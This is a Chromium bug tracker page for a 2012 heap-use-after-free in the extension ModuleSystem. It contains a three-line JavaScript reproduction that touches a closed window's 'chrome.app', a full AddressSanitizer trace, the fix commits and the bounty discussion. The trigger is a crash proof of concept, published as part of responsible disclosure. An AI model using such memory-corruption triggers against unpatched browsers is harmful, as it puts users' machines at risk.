# Heap-use-after-free in ModuleSystem::LazyFieldGetter

| Field | Value |
|-------|-------|
| **Issue ID** | [40056391](https://issues.chromium.org/issues/40056391) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Platforms** | Linux, Windows |
| **Reporter** | ax...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-04-08 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Heap-use-after-free can be triggered when accessing properties from closed window.

**VERSION**  

Version 20.0.1091.0 (130353) Ubuntu 10.10 x64  

Version 20.0.1091.0 (130362) Ubuntu 11.10 x64  

20.0.1094.1 canary Windows 7 x64  

Does not work on 18.0.1025.151 m Windows 7 x64

**REPRODUCTION CASE**

<script>
h = window.open();
h.close();
setTimeout('a = h.chrome; a.app;', 600);
</script>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

==1970== ERROR: AddressSanitizer heap-use-after-free on address 0x7fab0883a3e0 at pc 0x7fab240fe421 bp 0x7fff330ebd00 sp 0x7fff330ebcf8  

READ of size 4 at 0x7fab0883a3e0 thread T0  

#0 0x7fab240fe421 in ModuleSystem::NativesEnabledScope::NativesEnabledScope(ModuleSystem\*) ???:0  

#1 0x7fab240ffd6d in ModuleSystem::LazyFieldGetter(v8::Local[v8::String](javascript:void(0);), v8::AccessorInfo const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/chrome/renderer/module\_system.cc:107  

#2 0x7fab24c45c86 in v8::internal::JSObject::GetPropertyWithCallback(v8::internal::Object\*, v8::internal::Object\*, v8::internal::String\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/objects.cc:198  

#3 0x7fab24eaf5ac in v8::internal::LoadIC::Load(v8::internal::InlineCacheState, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::String](javascript:void(0);)) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/ic.cc:937  

#4 0x7fab24eb4f43 in v8::internal::LoadIC\_Miss(v8::internal::Arguments, v8::internal::Isolate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/ic.cc:1986  

#5 0x27f5e880618e in  

#6 0x27f5e8846120 in  

#7 0x27f5e8823dc7 in  

#8 0x27f5e8811357 in  

#9 0x7fab24b06e9f in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/execution.cc:118  

#10 0x7fab24a8742f in v8::Script::Run() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/api.cc:1589  

#11 0x7fab25f1d459 in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:382  

#12 0x7fab25f1c422 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:353  

#13 0x7fab2645ea79 in WebCore::ScheduledAction::execute(WebCore::V8Proxy\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/ScheduledAction.cpp:135  

#14 0x7fab262e6111 in WebCore::DOMTimer::fired() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/page/DOMTimer.cpp:149  

#15 0x7fab25c107a8 in WebCore::ThreadTimers::sharedTimerFiredInternal() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/platform/ThreadTimers.cpp:118  

#16 0x7fab27237a1d in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (webkit\_glue::WebKitPlatformSupportImpl::\*)()>, void ()(webkit\_glue::WebKitPlatformSupportImpl\*)>::MakeItSo(base::internal::RunnableAdapter<void (webkit\_glue::WebKitPlatformSupportImpl::\*)()>, webkit\_glue::WebKitPlatformSupportImpl\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/./base/bind\_internal.h:869  

#17 0x7fab2723784d in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (webkit\_glue::WebKitPlatformSupportImpl::\*)()>, void ()(webkit\_glue::WebKitPlatformSupportImpl\*), void ()(base::internal::UnretainedWrapper<webkit\_glue::WebKitPlatformSupportImpl>)>, void ()(webkit\_glue::WebKitPlatformSupportImpl\*)>::Run(base::internal::BindStateBase\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/./base/bind\_internal.h:1170  

#18 0x7fab242b5d3a in base::Timer::RunScheduledTask() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/timer.cc:182  

#19 0x7fab242b634d in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (base::BaseTimerTaskInternal::\*)()>, void ()(base::BaseTimerTaskInternal\*)>::MakeItSo(base::internal::RunnableAdapter<void (base::BaseTimerTaskInternal::\*)()>, base::BaseTimerTaskInternal\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/./base/bind\_internal.h:869  

#20 0x7fab242b6208 in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (base::BaseTimerTaskInternal::\*)()>, void ()(base::BaseTimerTaskInternal\*), void ()(base::internal::OwnedWrapper[base::BaseTimerTaskInternal](javascript:void(0);))>, void ()(base::BaseTimerTaskInternal\*)>::Run(base::internal::BindStateBase\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/./base/bind\_internal.h:1170  

#21 0x7fab2423d2f3 in MessageLoop::RunTask(base::PendingTask const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:458  

#22 0x7fab2423dae4 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:469  

#23 0x7fab2423e1a2 in MessageLoop::DoDelayedWork(base::TimeTicks\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:684  

#24 0x7fab2424a2df in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_pump\_default.cc:33  

#25 0x7fab2423cb0e in MessageLoop::RunInternal() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:417  

#26 0x7fab2423b7e8 in MessageLoop::Run() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:300  

#27 0x7fab27f6260c in RendererMain(content::MainFunctionParams const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/renderer/renderer\_main.cc:241  

#28 0x7fab2416ce94 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main\_runner.cc:245  

#29 0x7fab2416c9dd in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main\_runner.cc:290  

#30 0x7fab2416c37c in (anonymous namespace)::ContentMainRunnerImpl::Run() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main\_runner.cc:511  

#31 0x7fab2416b80f in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main.cc:35  

#32 0x7fab22f32887 in ChromeMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/chrome/app/chrome\_main.cc:32  

#33 0x7fab22f327eb in main /b/build/slave/ASAN\_Release\_\_symbolized\_/build/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#34 0x7fab1be03d8e in **libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

0x7fab0883a3e0 is located 96 bytes inside of 104-byte region [0x7fab0883a380,0x7fab0883a3e8)  

freed by thread T0 here:  

#0 0x7fab28fe1312 in operator delete(void\*) ??:0  

#1 0x7fab2411dd19 in ChromeV8Context::~ChromeV8Context() /b/build/slave/ASAN\_Release\_\_symbolized*/build/chrome/renderer/extensions/chrome\_v8\_context.cc:61  

#2 0x7fab240bd83d in base::DeleteHelper<ChromeV8Context>::DoDelete(void const\*) /b/build/slave/ASAN\_Release\_\_symbolized*/build/./base/sequenced\_task\_runner\_helpers.h:40  

#3 0x7fab2423edeb in base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(void const\*)>, void ()(void const\* const&)>::MakeItSo(base::internal::RunnableAdapter<void (\*)(void const\*)>, void const\* const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/./base/bind\_internal.h:869  

#4 0x7fab2423d2f3 in MessageLoop::RunTask(base::PendingTask const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:458  

#5 0x7fab2423dae4 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:469  

#6 0x7fab2423de9e in MessageLoop::DoWork() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:646  

#7 0x7fab2424a27e in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_pump\_default.cc:28  

#8 0x7fab2423cb0e in MessageLoop::RunInternal() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:417  

#9 0x7fab2423b7e8 in MessageLoop::Run() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/base/message\_loop.cc:300  

#10 0x7fab27f6260c in RendererMain(content::MainFunctionParams const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/renderer/renderer\_main.cc:241  

#11 0x7fab2416ce94 in (anonymous namespace)::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main\_runner.cc:245  

#12 0x7fab2416c9dd in (anonymous namespace)::RunNamedProcessTypeMain(std::basic\_string<char, std::char\_traits<char>, std::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main\_runner.cc:290  

#13 0x7fab2416c37c in (anonymous namespace)::ContentMainRunnerImpl::Run() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main\_runner.cc:511  

#14 0x7fab2416b80f in content::ContentMain(int, char const\*\*, content::ContentMainDelegate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/content/app/content\_main.cc:35  

#15 0x7fab22f32887 in ChromeMain /b/build/slave/ASAN\_Release\_\_symbolized\_/build/chrome/app/chrome\_main.cc:32  

#16 0x7fab22f327eb in main /b/build/slave/ASAN\_Release\_\_symbolized\_/build/chrome/app/chrome\_exe\_main\_gtk.cc:18  

#17 0x7fab1be03d8e in **libc\_start\_main /build/buildd/eglibc-2.12.1/csu/libc-start.c:258  

previously allocated by thread T0 here:  

#0 0x7fab28fe1192 in operator new(unsigned long) ??:0  

#1 0x7fab240c6b7e in ExtensionDispatcher::DidCreateScriptContext(WebKit::WebFrame\*, v8::Handle[v8::Context](javascript:void(0);), int, int) /b/build/slave/ASAN\_Release\_\_symbolized*/build/chrome/renderer/extensions/extension\_dispatcher.cc:531  

#2 0x7fab25ef7338 in WebCore::V8DOMWindowShell::initContextIfNeeded() /b/build/slave/ASAN\_Release\_\_symbolized*/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8DOMWindowShell.cpp:343  

#3 0x7fab25f1fff6 in WebCore::V8Proxy::mainWorldContext() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:642  

#4 0x7fab25f1fcb7 in WebCore::V8Proxy::mainWorldContext(WebCore::Frame\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:665  

#5 0x7fab25f1faf9 in WebCore::V8Proxy::context(WebCore::Frame\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:615  

#6 0x7fab25f30de8 in WebCore::toV8(WebCore::DOMWindow\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/custom/V8DOMWindowCustom.cpp:623  

#7 0x7fab25f30748 in WebCore::V8DOMWindow::openCallback(v8::Arguments const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/custom/V8DOMWindowCustom.cpp:464  

#8 0x7fab24acb087 in v8::internal::MaybeObject\* v8::internal::HandleApiCallHelper<false>(v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>, v8::internal::Isolate\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/builtins.cc:1115  

#9 0x27f5e880618e in  

#10 0x27f5e88476ac in  

#11 0x27f5e8823dc7 in  

#12 0x27f5e8811357 in  

#13 0x7fab24b06e9f in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/execution.cc:118  

#14 0x7fab24a8742f in v8::Script::Run() /b/build/slave/ASAN\_Release\_\_symbolized\_/build/v8/src/api.cc:1589  

#15 0x7fab25f1d459 in WebCore::V8Proxy::runScript(v8::Handle[v8::Script](javascript:void(0);)) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:382  

#16 0x7fab25f1c422 in WebCore::V8Proxy::evaluate(WebCore::ScriptSourceCode const&, WebCore::Node\*) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/V8Proxy.cpp:353  

#17 0x7fab25ec4c60 in WebCore::ScriptController::evaluate(WebCore::ScriptSourceCode const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/bindings/v8/ScriptController.cpp:195  

#18 0x7fab2574cd29 in WebCore::ScriptElement::executeScript(WebCore::ScriptSourceCode const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/dom/ScriptElement.cpp:290  

#19 0x7fab2574a8a7 in WebCore::ScriptElement::prepareScript(WTF::TextPosition const&, WebCore::ScriptElement::LegacyTypeSupport) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/dom/ScriptElement.cpp:235  

#20 0x7fab25b4a7ed in WebCore::HTMLScriptRunner::runScript(WebCore::Element\*, WTF::TextPosition const&) /b/build/slave/ASAN\_Release\_\_symbolized\_/build/third\_party/WebKit/Source/WebCore/html/parser/HTMLScriptRunner.cpp:298  

==1970== ABORTING  

Stats: 128M malloced (76M for red zones) by 124669 calls  

Stats: 4M realloced by 4072 calls  

Stats: 124M freed by 108297 calls  

Stats: 0M really freed by 0 calls  

Stats: 232M (59436 full pages) mmaped in 58 calls  

mmaps by size class: 8:114681; 9:16382; 10:12285; 11:4094; 12:1024; 13:1536; 14:256; 15:256; 16:64; 17:96; 18:32; 19:8; 20:24; 21:2; 22:23;  

mallocs by size class: 8:97597; 9:11792; 10:10158; 11:2692; 12:609; 13:1293; 14:185; 15:134; 16:36; 17:91; 18:31; 19:3; 20:24; 21:1; 22:23;  

frees by size class: 8:82566; 9:11197; 10:9856; 11:2420; 12:516; 13:1263; 14:167; 15:127; 16:29; 17:74; 18:31; 19:3; 20:24; 21:1; 22:23;  

rfrees by size class:  

Stats: malloc large: 173 small slow: 549  

Shadow byte and word:  

0x1ff56110747c: fd  

0x1ff561107478: fd fd fd fd fd fd fd fd  

More shadow bytes:  

0x1ff561107458: fd fd fd fd fd fd fd fd  

0x1ff561107460: fa fa fa fa fa fa fa fa  

0x1ff561107468: fa fa fa fa fa fa fa fa  

0x1ff561107470: fd fd fd fd fd fd fd fd  

=>0x1ff561107478: fd fd fd fd fd fd fd fd  

0x1ff561107480: fa fa fa fa fa fa fa fa  

0x1ff561107488: fa fa fa fa fa fa fa fa  

0x1ff561107490: fd fd fd fd fd fd fd fd  

0x1ff561107498: fd fd fd fd fd fd fd fd

## Timeline

### pa...@chromium.org (2012-04-09)

I cannot repro with 18.0.1025.151 or 20.0.1093.0 on Mac OS X. (Had to disable pop-up blocking, of course.) Will try on Linux on Monday.

### pa...@google.com (2012-04-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=34723419

Uploader: palmer@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7fc6c5da9fe0
Crash State:
  - crash stack -
  ModuleSystem::LazyFieldGetter
  v8::internal::JSObject::GetPropertyWithCallback
  - free stack -
  ChromeV8Context::~ChromeV8Context
  base::DeleteHelper<ChromeV8Context>::DoDelete
  

Unminimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95x2CyusUGN5d9RbDMeEyIPOsOUf_9HYP8STtaBHlX4ZVX8M7Kqe4uZrsZl6V3tTxXv-UdgTaE0bc8QaioFNrgD9Nn6R3mawCeFayAzpAr_8kfOl8duohgcnDR6-mvbjZxhwTphmbugshRIwNZYKGxGaXLYsw

### pa...@chromium.org (2012-04-09)

Not sure why this would work on Windows and Linux but not Mac. danno, can you take a look? Looks like it's trunk/canary-only.

### pa...@chromium.org (2012-04-09)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-09)

This has regressed in http://src.chromium.org/viewvc/chrome?view=rev&revision=129162. We should always update bug after ClusterFuzz gives the regression range. 129162 < 129376 which is when m19 branched.

### in...@chromium.org (2012-04-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-04-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-04-13)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=132233

------------------------------------------------------------------------
r132233 | koz@chromium.org | Fri Apr 13 12:16:54 PDT 2012

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/renderer/module_system.h?r1=132233&r2=132232&pathrev=132233
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/renderer/extensions/extension_dispatcher.cc?r1=132233&r2=132232&pathrev=132233
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/renderer/module_system.cc?r1=132233&r2=132232&pathrev=132233
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/renderer/module_system_unittest.cc?r1=132233&r2=132232&pathrev=132233

Make lazy field access handle the case where ModuleSystem has been deleted.


BUG=122562
TEST=


Review URL: http://codereview.chromium.org/10050029
------------------------------------------------------------------------

### in...@chromium.org (2012-04-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2012-04-14)

ClusterFuzz has detected this issue as fixed in range 132231:132266.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=34723419

Uploader: palmer@chromium.org

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7fd6288f3960
Crash State:
  - crash stack -
  ModuleSystem::LazyFieldGetter
  v8::internal::JSObject::GetPropertyWithCallback
  - free stack -
  ChromeV8Context::~ChromeV8Context
  base::DeleteHelper<ChromeV8Context>::DoDelete
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=129159:129170
Fixed: https://cluster-fuzz.appspot.com/revisions?range=132231:132266

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv95nmp3yvS8HCP8jHhiWjkkunZFcXuEdOpUCCJ9N0yRs32d2l5-su5wSAN8MYKj7_NXBTxi9WU-PtW2VdMs_8G4vI0ann24JQ0mxd6jpjvyxug7IDSijoJR0VOxaaQ9NNxo0PnafpleGWQokfWp3pH3gDGuzlA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2012-04-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-24)

$500 because this was found in active code churn. Great catch Ax330d.

### sc...@gmail.com (2012-04-30)

M19: r134520


### bu...@chromium.org (2012-04-30)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=134520

------------------------------------------------------------------------
r134520 | cevans@chromium.org | Mon Apr 30 02:09:39 PDT 2012

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/1084/src/chrome/renderer/extensions/extension_dispatcher.cc?r1=134520&r2=134519&pathrev=134520
 M http://src.chromium.org/viewvc/chrome/branches/1084/src/chrome/renderer/module_system.cc?r1=134520&r2=134519&pathrev=134520
 M http://src.chromium.org/viewvc/chrome/branches/1084/src/chrome/renderer/module_system_unittest.cc?r1=134520&r2=134519&pathrev=134520
 M http://src.chromium.org/viewvc/chrome/branches/1084/src/chrome/renderer/module_system.h?r1=134520&r2=134519&pathrev=134520

Merge 132233 - Make lazy field access handle the case where ModuleSystem has been deleted.


BUG=122562
TEST=


Review URL: http://codereview.chromium.org/10050029

TBR=koz@chromium.org
------------------------------------------------------------------------

### sc...@gmail.com (2012-04-30)

@Ax330d: I appealed the reward because we probably would have shipped this security regression to stable, had it not been for your report.

The appeal was successful. The reward is raised to $1000.

### ax...@gmail.com (2012-04-30)

Thanks Chris!

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Updating status to Fixed on security bugs which were fixed when m19 went to stable.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/122562?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056391)*
